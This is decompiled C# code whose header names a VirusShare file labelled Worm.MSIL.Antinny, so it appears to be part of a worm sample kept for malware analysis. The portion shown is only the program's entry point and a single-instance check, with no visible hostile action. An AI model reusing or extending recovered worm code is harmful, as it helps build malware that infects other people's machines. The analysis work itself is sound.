// Decompiled with JetBrains decompiler
// Type: WindowsApplication2.GetHostNameSample
// Assembly: WindowsApplication2, Version=1.0.1942.42864, Culture=neutral, PublicKeyToken=null
// MVID: 1F798A8A-ADED-4AFE-8C88-012ACD701081
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Worm.MSIL.Antinny.a-a31d15c2216467ce504cc220ba5aef384e797034a2924cb371ef43f0e87fd34c.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace WindowsApplication2
{
  [StandardModule]
  internal sealed class GetHostNameSample
  {
    public static string dnsname;
    public static string username;
    public static string cline;
    public static string wpash;
    public static long tcnt;
    public static long fnmmax;
    public static string[] fnm = new string[100000];
    public static long drv;

    [STAThread]
    public static void Main(string[] CmdArgs)
    {
      GetHostNameSample.dnsname = SystemInformation.UserName;
      GetHostNameSample.drv = 99L;
      GetHostNameSample.tcnt = 0L;
      string[] strArray = CmdArgs;
      int index = 0;
      while (index < strArray.Length)
      {
        GetHostNameSample.cline = strArray[index];
        checked { ++index; }
      }
      int num = (int) new Form1().ShowDialog();
    }

    private static bool ExistsPrevInstance()
    {
      bool flag;
      try
      {
        flag = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length > 1;
      }
      catch (InvalidOperationException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }
  }
}
